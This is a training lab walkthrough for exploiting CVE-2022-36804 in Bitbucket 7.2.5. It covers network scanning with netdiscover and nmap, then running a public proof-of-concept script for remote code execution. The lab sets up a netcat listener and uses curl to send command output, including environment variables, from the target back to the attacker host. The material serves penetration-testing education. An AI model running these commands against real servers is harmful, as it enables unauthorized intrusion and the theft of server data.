###### Lab Instructions

Log on to the Attacker host with the following credentials:

- User: kali
- Password: kali

![CVE Bitbucket Image 1.2.1.png](https://images.ctfassets.net/kvf8rpi09wgk/1W8DAo0REz0HsWdJmrcoQQ/b9206393816b68694d0fd1c13e93fff4/kali_bitbucket.png)

Knowing you have to scan for internal network hosts, you will use the [Netdiscover tool](https://www.kali.org/tools/netdiscover/). Netdiscover will actively send Address Resolution Protocol (ARP) requests on the network to discover online hosts. First, we must locate our own IP address and the size of the network we are on.

Open a terminal window by right-clicking on the Kali Desktop and clicking “Open Terminal Here”. Type ip a to locate your IP address:

![CVE Bitbucket Image 1.2.2.png](https://images.ctfassets.net/kvf8rpi09wgk/Qt3KoZUvxzw3llRkFmWC8/b792e83608d70a862fa9785f9cf19329/Locate_IP_Address.png)

Note that on interface eth0 your IP address is 192.168.1.50 with a CIDR of /24. This CIDR block means there are 254 assignable hosts on the network. This becomes important when using Netdiscover to narrow down which hosts are actually on the network.

In your terminal window, type:

```
sudo netdiscover -r 192.168.1.1/24
```

You will be prompted to enter your password of kali to run the scan. The scan should not take a long time, and you discover that host 192.168.1.100 is online:

![CVE Bitbucket Image 1.2.3.png](https://images.ctfassets.net/kvf8rpi09wgk/7qHzKjaT1gP1CfXJThaNX6/1b071f5f724f99f869918b1e48030342/Host_Discovery.png)

Press CTRL+C to exit out of the Netdiscover window.

You will now use Nmap to scan host 192.168.1.100. As this is the only host you discovered, you will scan all ports on the host to determine if any are open. Type nmap 192.168.1.100 -sV -p- -vvv and run your scan.

- -sV scans for service version
- -p- scans ports 1-65535
- -vvv prints very, very, very verbosely.

![CVE Bitbucket Image 1.2.4.png](https://images.ctfassets.net/kvf8rpi09wgk/6tUwpEDAuyIcaQMUIvf22X/e29676168cd93561751e3f0680d7b157/Nmap_scan.png)

Nmap will report that both ports 7990 and 7999 are open and unrecognized. Reading through the service fingerprint for port 7990, we can locate a URL:

![CVE Bitbucket Image 1.2.5.png](https://images.ctfassets.net/kvf8rpi09wgk/1OmUwOxV2jIVZDk8RfCmBT/69c0e7ca87e175eab33ca8ef565a94c7/localhost.png)

It appears port 7990 might be running a web server. Open a web browser and go to http://192.168.1.100:7990

![CVE Bitbucket Image 1.2.6..png](https://images.ctfassets.net/kvf8rpi09wgk/hNHTYnYHK7UOZR5JB2lGn/ba1568d077ff0e893b72288c87ba969a/Public_repositories.png)

Observe the server is running BitBucket version 7.2.5, meaning that it’s vulnerable to CVE-2022-36804! As you learned in the first lesson, in order to perform the RCE, you must find a public repo. Luckily, it appears the hello-world repo under the CFX project is public:

![CVE Bitbucket Image 1.2.7.png](https://images.ctfassets.net/kvf8rpi09wgk/64NwF2t3earUIkV4eFiONh/346715eb1a36dd78fae0fa8d5b0645d8/hello_world.png)

On your desktop, you have an exploit script written by BenHays142 for CVE-2022-36804. In the terminal, type:

```
cd ~/Desktop/CVE-2022-36804-PoC-Exploit
```

Note that tab completion is your friend here, so you don’t have to type the full directory name.

It is always important to read the exploit code you use to know what it is doing and ensure that it does not contain any destructive code. Type mousepad main.py to open the exploit code in Mousepad and read through the code. Note that the code checks for open repos in the /rest/api/latest/repos endpoint (line 16), which was mentioned in our first lesson. Also note line 35, where the command you choose is sent to the server.

![CVE Bitbucket Image 1.2.8.png](https://images.ctfassets.net/kvf8rpi09wgk/6nyYkPfUl5vVGQnsOjr0ZX/9453c87e94fe3f724b87f7110efda2a1/Mousepad.png)

After reading through the code, close out of Mousepad.

In your terminal, type python3 main.py -h and observe the command options.

![CVE Bitbucket Image 1.2.9.png](https://images.ctfassets.net/kvf8rpi09wgk/6iAphxUDAOQCggOPOagXPl/22efcd26067ae900c1e4b712208bdb86/exploit_bitbucket.png)

Although you know the repo is hello-world and the project is CFX, the script can automatically detect this. To verify the script detects the correct repo and project, enter the following command:

```
python3 main.py 192.168.1.100:7990
```

![CVE Bitbucket Image 1.2.10.png](https://images.ctfassets.net/kvf8rpi09wgk/7rvMgHEYDj2rN3zhGLUCnp/11438401c5b7bdee27f0b7820ce1a789/repo_script.png)

The script found the repo and project and also determined that the site is vulnerable to CVE-2022-36804. You can now add the --command flag to execute a command to perform RCE. You will use the id command to determine what user the server is running as. Enter the following command:

```
python3 main.py 192.168.1.100:7990 --command id
```

![CVE Bitbucket Image 1.2.11.png](https://images.ctfassets.net/kvf8rpi09wgk/6CqDoDcLqwfUplemZt5LQk/ecb50d870e0fd930a15254851eeb398a/commandid.png)

You observe the server is running as the bitbucket user, but it appears that you do not see the whole output of the command. In some cases as a pentester, you may be unable to see the full output from your commands (usually called a “blind” injection). Sometimes you also cannot obtain a full shell on a remote server. In these cases, you must think outside the box!

Open a new terminal window and use the netcat utility to create a listener on your kali box:

```
nc -nlvp 4444
```

Back in your other terminal window, you will execute the exploit script, but write the output of your command to a file in the vulnerable server’s temp directory:

```
python3 main.py 192.168.1.100:7990 --command “id > /tmp/file”
```

Note: The tmp directory is typically writable by all users, making it a great place to store files as a pentester.

![CVE Bitbucket Image 1.2.12.png](https://images.ctfassets.net/kvf8rpi09wgk/6GKUj1R3BVIcymlyapccuQ/08bd5b14e663f7dcfa1154c5ccb03a82/tmpfile.png)

In this case, you are redirecting the output of the id command to a file named “file” in the /tmp directory.

Retrieve the file by using the cURL command to send the output of the file back to our Kali box in the netcat listener that you set up previously:

```
python3 main.py 192.168.1.100:7990 --command “curl -d @/tmp/file 192.168.1.50:4444”
```

You should see the full output of your id command as a POST request in the netcat listener:

![CVE Bitbucket Image 1.2.13.png](https://images.ctfassets.net/kvf8rpi09wgk/3310ryxXpo901C6XRS8Bnz/c1eab4e2e9cb876090b2ba1a8201e18c/netcatlistener.png)

Enter CTRL+C in the netcat listener terminal to stop the connection.

You can use this same technique of redirecting the output of a command to a file and then using cURL to retrieve the output of the command in the netcat listener. The example below is redirecting the output of the env command. It then uses cURL to observe the full output of the command, seeing the environmental variables on the vulnerable server:

![CVE Bitbucket Image 1.2.14.png](https://images.ctfassets.net/kvf8rpi09wgk/73BdhWtjlyZy5lvmhKFj9A/41a63d7d0c0a46fb7e77c3c3fdd57deb/env.png)

Although this is not a true shell on the vulnerable server, it is another way to perform a remote code execution (RCE) attack and observe the output of the command using an out-of-band server.